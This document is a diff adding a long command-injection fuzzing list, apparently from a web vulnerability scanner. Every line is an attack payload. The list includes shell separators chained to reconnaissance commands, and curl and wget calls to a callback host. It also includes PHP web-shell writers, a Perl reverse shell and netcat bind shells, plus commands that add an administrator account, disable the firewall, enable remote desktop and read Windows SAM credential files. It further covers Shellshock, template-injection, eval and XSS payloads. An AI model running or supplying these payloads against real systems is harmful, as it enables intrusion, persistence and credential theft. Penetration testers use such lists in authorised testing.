@@ -1,0 +1,479 @@
+ {${phpinfo()}}
+ {${sleep(20)}}
+ {${sleep(3)}}
+ {${sleep(hexdec(dechex(20)))}} 
+ curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+; dir
+; dir C:\
+; dir C:\Documents and Settings\*
+; dir C:\Users
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+; ifconfig
+; ipconfig /all
+; ls -l /
+; ls -l /etc/
+; ls -l /home/*
+; ls -l /tmp
+; ls -l /var/www/*
+; ls -laR /etc
+; ls -laR /var/www
+; nc -lvvp 4444 -e /bin/sh;
+; net localgroup Administrators hacker /ADD
+; net user hacker Password1 /ADD
+; net view
+; netsh firewall set opmode disable
+; netstat -an
+; perl -e 'print "X"x16096'
+; perl -e 'print "X"x2048'
+; perl -e 'print "X"x4096'
+; perl -e 'print "X"x8096'
+; pwd
+; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+; sleep 1
+; sleep 10
+; sleep 15
+; sleep 5
+; sysinfo
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+; system('sleep 5');
+; systeminfo
+; type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SYSTEM
+; type C:\Windows\repair\SAM
+; type C:\Windows\repair\SYSTEM
+; type C:\WINNT\repair\SAM
+; uname -a
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+; whoami
+;{$_GET["cmd"]}
+;/usr/bin/id|
+;|/usr/bin/id|
+;${@print(md5(RCEVulnerable))};
+;echo '<script>alert(1)</script>'
+;echo%20'<script>alert(1)</script>'
+;id
+;id;
+;id\n
+;id|
+;netstat -a;
+;phpinfo()
+;phpinfo();//
+;uname;
+:phpversion();
+!%whoami
+!%whoami%!
+!whoami!
+'
+' & dir
+' & whoami
+' && dir
+' && whoami
+' || dir
+' || whoami
+' dir
+' whoami
+'; dir
+'; whoami
+';phpinfo();//
+'"
+"
+" & dir
+" & whoami
+" && dir
+" && whoami
+" | dir
+" | whoami
+" || dir
+" || whoami
+" dir
+" whoami
+"; dir
+"; whoami
+".system('dir')."
+"'
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+() { :;}; echo vulnerable 10
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("C:\boot.ini") }}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+{{4+4}}
+{{4+8}}
+{{person.name}}
+{{person.secret}}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{${phpinfo()}}
+{${sleep(10)}}
+{${sleep(20)}}
+{${sleep(3)}}
+{${sleep(hexdec(dechex(20)))}} 
+{1} + {1}
+*; ls -lhtR /var/www/
+/index.html|id|
+\! whoami
+\n
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+\nid;
+\nid\n
+\nid|
+\r
+\r\n
+& 
+& curl http://crowdshield.com/.testing/rce.txt
+& dir
+& dir C:\
+& dir C:\Documents and Settings\*
+& dir C:\Users
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+& id
+& ifconfig
+& ipconfig /all
+& ls -l /
+& ls -l /etc/
+& ls -l /home/*
+& ls -l /tmp
+& ls -l /var/www/*
+& ls -laR /etc
+& ls -laR /var/www
+& nc -lvvp 4444 -e /bin/sh&
+& net localgroup Administrators hacker /ADD
+& net user hacker Password1 /ADD
+& net view
+& netsh firewall set opmode disable
+& netstat -an
+& perl -e 'print "X"x16096'
+& perl -e 'print "X"x2048'
+& perl -e 'print "X"x4096'
+& phpinfo()
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+& pwd
+& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+& sleep 1
+& sleep 10 
+& sleep 15 
+& sleep 5
+& sysinfo
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+& system('sleep 5');
+& systeminfo
+& type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SYSTEM
+& type C:\Windows\repair\SAM
+& type C:\Windows\repair\SYSTEM
+& type C:\WINNT\repair\SAM
+& uname -a
+& wget http://crowdshield.com/.testing/rce.txt
+& whoami
+&& 
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+&& dir
+&& dir C:\
+&& dir C:\Documents and Settings\*
+&& dir C:\Users
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
+&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+&& ifconfig
+&& ipconfig /all
+&& ls -l /
+&& ls -l /etc/
+&& ls -l /home/*
+&& ls -l /tmp
+&& ls -l /var/www/*
+&& ls -laR /etc
+&& ls -laR /var/www
+&& nc -lvvp 4444 -e /bin/sh &
+&& net localgroup Administrators hacker /ADD
+&& net user hacker Password1 /ADD
+&& net view
+&& netsh firewall set opmode disable
+&& netstat -an
+&& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x2048'
+&& perl -e 'print "X"x4096'
+&& perl -e 'print "X"x8096'
+&& phpinfo()
+&& pwd
+&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+&& sleep 1
+&& sleep 10
+&& sleep 15
+&& sleep 5
+&& sysinfo
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+&& system('sleep 5');
+&& systeminfo
+&& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SYSTEM
+&& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SYSTEM
+&& type C:\WINNT\repair\SAM
+&& uname -a
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+&& whoami
+&&dir
+&&id
+&&type C:\\boot.ini
+%!whoami
+%!whoami!%
+%0a
+%0a id %0a
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%0a%0d
+%0a+dir+c:\
+%0a+dir+c:%255c
+%0a+dir+c:%2f
+%0Aid
+%0Aid%0A
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+%22.system%28%27dir%27%29.%22
+%22%20%26%20dir
+%22%20%26%26%20dir
+%22%20%7C%20dir
+%22%20%7C%7C%20dir
+%22%20dir
+%22%3B%20dir
+%24%28%60dir%60%29
+%26%20dir
+%26%20dir%20C%3A%5C
+%26%26%20dir
+%26%26%20dir%20C%3A%5C
+%26%26+|+dir c:\
+%26%26+|+dir c:%255c
+%26%26+|+dir c:%2f
+%26%26dir
+%27%20%26%20dir
+%27%20%26%26%20dir
+%27%20%7C%7C%20dir
+%27%20dir
+%27%3B%20dir
+%3B%20dir
+%3B%20dir%20C%3A%5C
+%7C%20dir
+%7C%20dir%20C%3A%5C
+%whoami%
+`
+`id`
+`ping 127.0.0.1`
++|+Dir+c:\
++|+dir+c:\+|
++|+Dir+c:%255c
++|+Dir+c:%2f
++|+dir+c:%2f+|
++dir+c:\+|
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
+<?php system("sleep 10");?>
+<?php system("sleep 5");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+| 
+| curl http://crowdshield.com/.testing/rce.txt
+| dir
+| dir C:\
+| dir C:\Documents and Settings\*
+| dir C:\Users
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
+| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+| id
+| ifconfig
+| ipconfig /all
+| ls -l /
+| ls -l /etc/
+| ls -l /home/*
+| ls -l /tmp
+| ls -l /var/www/*
+| ls -laR /etc
+| ls -laR /var/www
+| nc -lvvp 4444 -e /bin/sh|
+| net localgroup Administrators hacker /ADD
+| net user hacker Password1 /ADD
+| net view
+| netsh firewall set opmode disable
+| netstat -an
+| perl -e 'print "X"x16096'
+| perl -e 'print "X"x4096'
+| perl -e 'print "X"x8096'
+| phpinfo()
+| pwd
+| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+| sleep 1
+| sleep 10
+| sleep 15
+| sleep 5
+| sysinfo
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+| system('sleep 5');
+| systeminfo
+| type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SYSTEM
+| type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+| type C:\WINNT\repair\SAM
+| uname -a
+| wget http://crowdshield.com/.testing/rce.txt
+| whoami
+|/usr/bin/id
+|| 
+|| perl -e 'print "X"x16096'
+|| perl -e 'print "X"x4096'
+|| perl -e 'print "X"x8096'
+|| phpinfo()
+|| sleep 10
+|| sleep 15
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
+|| system('sleep 5');
+||+dir|c:\
+|id
+$;/usr/bin/id
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`dir`)
+$(`ls`)
+$(`type C:\boot.ini`)
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+$(`whoami`)
+${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+$%26%26dir c:\
+$%26%26dir+c:%255c
+$%26%26dir+c:%2f
+$+|+Dir+c:\
+$+|+Dir+c:%255c
+$+|+Dir+c:%2f
+a;id;
+a;id\n
+a;id|
+a|id|
+curl https://crowdshield.com/.testing/rce_vuln.txt
+curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
+dir
+dir C:\
+dir C:\Documents and Settings\*
+dir C:\Users
+dir%20C%3A%5C
+dir+c:\
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+echo '<script>alert(1)</script>'// XXXXXXXXXXX
+echo "<?php include($_GET['page']); ?>" > rfi.php
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+echo "<?php system($_GET['cmd']); ?>" > cmd.php
+echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+ifconfig
+ipconfig
+ipconfig /all
+ls
+ls -l /
+ls -l /etc/
+ls -l /home/*
+ls -l /tmp
+ls -l /var/www/*
+ls -lh /etc/
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+net localgroup Administrators hacker /ADD
+net user hacker Password1 /ADD
+net view
+netsh firewall set opmode disable
+netstat
+netstat -an
+perl -e 'print "X"x1024'
+perl -e 'print "X"x16384'
+perl -e 'print "X"x2048'
+perl -e 'print "X"x4096'
+perl -e 'print "X"x8192'
+perl -e 'print "X"x81920'
+phpinfo()
+phpinfo();
+pwd
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+route
+sleep 1
+sleep 10
+sleep 5
+somedir \x1a whoami
+sysinfo
+system('cat C:\boot.ini');
+system('cat config.php');
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
+system('curl https://crowdshield.com/.testing/rce_vuln.txt')
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+system('ls')
+system('pwd')
+system('pwd');
+system('sleep 5')
+system('sleep 5');
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+system('whoami')
+system('whoami');
+systeminfo
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test* | perl -e 'print "X"x16096'
+test* || perl -e 'print "X"x16096'
+test*; ls -lhtR /var/www/
+test*; perl -e 'print "X"x16096'
+type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SYSTEM
+type C:\Windows\repair\SAM
+type C:\Windows\repair\SYSTEM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+uname
+uname -a
+wget https://crowdshield.com/.testing/rce_vuln.txt
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+word " c:\\where\\ || dir || '
